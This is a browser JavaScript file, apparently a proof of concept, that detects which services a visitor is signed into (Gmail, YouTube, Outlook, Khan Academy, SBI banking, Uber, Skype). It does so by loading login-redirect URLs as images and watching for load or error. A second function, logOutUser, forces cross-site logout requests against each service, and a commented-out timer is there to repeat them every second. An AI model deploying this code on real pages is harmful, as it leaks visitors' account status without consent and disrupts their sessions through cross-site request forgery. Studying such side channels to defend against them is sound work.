var platforms = [{
  domain: "https://accounts.google.com",
  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
  name: "Gmail",
  loggedIn: false,
  logoutPath:"/logout"
},{
  domain: "https://accounts.google.com",
  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
  name: "Youtube",
  loggedIn : false,
  logoutPath:"/logout"    	
},{
	domain: "https://outlook.live.com",
	redirect: "/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
	name: "Outlook",
	loggedIn : true,
	logoutPath:"/owa/logoff.owa"    	
},{
   domain: "https://www.khanacademy.org",
   redirect: "/login?continue=%2Ffavicon.ico",
   name: "KhanAcademy",
   loggedIn : false,
   logoutPath:"/logout?continue=/"
   },
   {
   domain: "https://retail.onlinesbi.com",
   redirect: "/sbijava/images/logoutimages/right_curve.jp",
   name: "SBI",
   loggedIn : false,
   logoutPath:"/retail/logout.htm"
   },{
  domain: "https://riders.uber.com",
  redirect: "/login/?next_url=https://riders.uber.com/",
   name: "Uber",
   loggedIn : false,
   logoutPath:"/logout"
  }, {
  domain: "https://secure.skype.com",
  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
  name: "Skype",
  loggedIn: false,
  logoutPath:"/portal/logout"
}
];


var leakSocialMediaAccounts = function(callback) {
  
  platforms.forEach(function(network) {
  	if(network.loggedIn===false){
	    var img = document.createElement('img');
	    img.src = network.domain + network.redirect;
	    img.onload = function() {
	      network.loggedIn=true;            
	      callback(network, true);
	    };
	    img.onerror = function() {
	      network.loggedIn=false;            
	      callback(network, false);
	    };
    }

  });
};

var isFirstLoggedIn = true;

function displayResult(network, loggedIn) {
  var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
  var favicon = faviconUri(network);
  var url = network.domain + network.redirect;
  var el = '<a target="_blank" href="' + url + '" target="_blank" class="network btn"><img src=' + favicon + '> <span>' + network.name + '</span></a>';
  if (loggedIn && isFirstLoggedIn) {
    isFirstLoggedIn = false;
    document.getElementById(id).innerHTML = el;
  } else {
    document.getElementById(id).innerHTML += el;
  }
}

leakSocialMediaAccounts(displayResult);

function faviconUri(network) {
  var favicon = network.domain + '/favicon.ico';
  if (network.name === 'Dropbox') {
    favicon = 'https://www.dropbox.com/static/images/favicon.ico';
  }
  if (network.name === 'Youtube') {
    favicon = 'https://www.youtube.com/favicon.ico';
  }
  if (network.name === 'Gmail') {
    favicon = 'https://mail.google.com/favicon.ico';
  }
  
  return favicon;
}

function logOutUser(){

  console.log('Starting to log out');
  
  platforms.forEach(function(network) {
  	console.log(network.name + ':' + network.loggedIn);
      console.log('Checking:' + network.name);

      var img = document.createElement('img');
      img.src = network.domain + network.logoutPath;
      console.log(img.src);

      
      img.onload = function() {
	//This fuction will never be called because these url dont return an image
		console.log("Logout Sucessfully");          
      };
      
      img.onerror = function() {
		console.log("Logging you out of " + network.name);          				            
      };
    

    
  });

};

// setInterval(logOutUser,1000);	
